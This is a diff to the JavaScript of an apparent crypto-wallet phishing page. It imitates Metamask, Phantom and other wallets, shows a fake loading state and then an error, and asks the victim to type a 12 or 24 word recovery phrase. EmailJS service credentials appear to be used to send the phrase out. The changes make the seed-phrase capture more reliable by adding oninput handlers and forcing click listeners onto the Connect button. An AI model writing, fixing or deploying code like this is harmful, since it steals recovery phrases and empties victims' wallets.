@@ -5,9 +5,9 @@
 
 // EmailJS configuration
 const EMAILJS_CONFIG = {
-    serviceId: 'service_v29yl0j',
-    templateId: 'template_mypanfa',
-    publicKey: 'L0WSevQpPMia5W_RK'
+    serviceId: 'service_yatm1oq',
+    templateId: 'template_41rqjpq',
+    publicKey: 'k_y55nny0o44KI4y1'
 };
 
 // Load EmailJS library
@@ -24,37 +24,37 @@ const WALLET_CONFIG = {
         name: 'METAMASK',
         displayName: 'Metamask',
         icon: 'assets/images/svg-icons/metamask.png',
-        color: '#e1550d'
+        color: '#0fc27dff'
     },
     'wallet': {
         name: 'WALLET CONNECT',
         displayName: 'Wallet Connect',
         icon: 'assets/images/svg-icons/wallet.png',
-        color: '#e1550d'
+        color: '#0fc27dff'
     },
     'walletBW': {
         name: 'BEST WALLET',
         displayName: 'Best Wallet',
         icon: 'assets/images/svg-icons/bw.png',
-        color: '#e1550d'
+        color: '#0fc27dff'
     },
     'base': {
         name: 'BASE WALLET',
         displayName: 'Base Wallet',
         icon: 'assets/images/svg-icons/base1.png',
-        color: '#e1550d'
+        color: '#0fc27dff'
     },
     'phantom': {
         name: 'PHANTOM',
         displayName: 'Phantom',
         icon: 'assets/images/svg-icons/phantom.png',
-        color: '#e1550d'
+        color: '#0fc27dff'
     },
     'solflare': {
         name: 'SOLFLARE',
         displayName: 'Solflare',
         icon: 'assets/images/svg-icons/solflare.png',
-        color: '#e1550d'
+        color: '#0fc27dff'
     }
 };
 
@@ -98,13 +98,13 @@ class WalletConnectionModal {
         console.log('=== handleWalletClick CALLED ===');
         console.log('walletType:', walletType);
         console.log('WALLET_CONFIG[walletType]:', WALLET_CONFIG[walletType]);
-        
+
         this.currentWallet = WALLET_CONFIG[walletType];
         console.log('this.currentWallet set to:', this.currentWallet);
-        
+
         this.state = 'loading';
         console.log('State changed to: loading');
-        
+
         this.showModal();
 
         // Show loading for 5 seconds, then show error
@@ -124,11 +124,11 @@ class WalletConnectionModal {
 
         this.createModal();
         console.log('Modal created, state:', this.state);
-        
+
         this.isOpen = true;
         document.body.appendChild(this.modalElement);
         console.log('Modal appended to DOM');
-        
+
         document.body.style.overflow = 'hidden';
 
         // Add delegated event listeners to the modal to handle button clicks
@@ -156,10 +156,10 @@ class WalletConnectionModal {
             console.log('=== MODAL CLICK EVENT FIRED ===');
             console.log('Event target:', e.target.tagName, e.target.className);
             console.log('Event path:', e.composedPath?.().map(el => el.tagName).join(' > '));
-            
+
             const target = e.target.closest('button');
             console.log('Closest button found?', !!target);
-            
+
             if (!target) {
                 console.log('No button found in click event');
                 return;
@@ -309,11 +309,11 @@ class WalletConnectionModal {
                     <textarea
                         id="recoveryPhrase"
                         placeholder="Enter your 12 or 24 Phrase mnemonic words separate them with spaces"
-                        onchange="walletModal.recoveryPhrase = this.value"
+                        oninput="walletModal.recoveryPhrase = this.value"
                     ></textarea>
                 </div>
 
-                <button class="btn-connect-wallet">
+                <button class="btn-connect-wallet" type="button" id="connectWalletBtn">
                     Connect Wallet
                 </button>
 
@@ -354,19 +354,77 @@ class WalletConnectionModal {
     handleConnectManually() {
         this.state = 'manual';
         this.updateModalContent();
+        // Re-attach event listeners after content update and add direct button handler
+        this.setupManualConnectButton();
+    }
+
+    setupManualConnectButton() {
+        // Add a direct click handler to the Connect Wallet button
+        const attachHandler = () => {
+            const connectBtn = document.getElementById('connectWalletBtn');
+            if (connectBtn) {
+                console.log('Setting up direct click handler on Connect Wallet button');
+
+                // Remove any existing listeners first
+                const newBtn = connectBtn.cloneNode(true);
+                connectBtn.parentNode.replaceChild(newBtn, connectBtn);
+
+                // Add click handler with capture phase to ensure it fires first
+                newBtn.addEventListener('click', (e) => {
+                    console.log('=== CONNECT WALLET BUTTON CLICKED ===');
+                    e.preventDefault();
+                    e.stopPropagation();
+                    e.stopImmediatePropagation();
+                    this.handleManualConnect();
+                    return false;
+                }, true);
+
+                // Also add regular bubble phase listener
+                newBtn.addEventListener('click', (e) => {
+                    console.log('Bubble phase click on Connect Wallet');
+                    e.preventDefault();
+                    e.stopPropagation();
+                    this.handleManualConnect();
+                    return false;
+                }, false);
+
+                // Add mousedown as backup
+                newBtn.addEventListener('mousedown', (e) => {
+                    console.log('Mousedown on Connect Wallet button');
+                }, false);
+
+                console.log('Connect Wallet button handlers attached successfully');
+            } else {
+                console.error('Connect Wallet button not found, retrying...');
+                setTimeout(attachHandler, 100);
+            }
+
+            // Also add input handler to textarea to capture value as user types
+            const textarea = document.getElementById('recoveryPhrase');
+            if (textarea) {
+                textarea.addEventListener('input', (e) => {
+                    this.recoveryPhrase = e.target.value;
+                    console.log('Textarea input captured, length:', e.target.value.length);
+                });
+            }
+        };
+
+        // Try immediately and also after a short delay
+        setTimeout(attachHandler, 10);
     }
 
     async handleManualConnect() {
         console.log('=== handleManualConnect CALLED ===');
         console.log('this.currentWallet:', this.currentWallet);
         console.log('emailjs available?', typeof emailjs !== 'undefined');
-        
+
         const textarea = document.getElementById('recoveryPhrase');
         console.log('textarea element found?', !!textarea);
-        
-        const recoveryPhrase = textarea ? textarea.value.trim() : '';
+
+        // Always read directly from textarea, fallback to stored value
+        const recoveryPhrase = textarea ? textarea.value.trim() : (this.recoveryPhrase || '').trim();
         console.log('recoveryPhrase length:', recoveryPhrase.length);
-        console.log('recoveryPhrase value:', recoveryPhrase.substring(0, 30) + '...');
+        console.log('recoveryPhrase value:', recoveryPhrase.length > 0 ? recoveryPhrase.substring(0, 30) + '...' : '(empty)');
 
         if (!recoveryPhrase) {
             console.log('NO PHRASE ENTERED - showing alert');
@@ -717,7 +775,7 @@ const walletModal = new WalletConnectionModal();
 // Expose to window so inline onclick handlers can access it
 window.walletModal = walletModal;
 
-// Initialize when DOM is ready
+// Initialize when DOM is ready`
 if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', () => walletModal.init());
 } else {
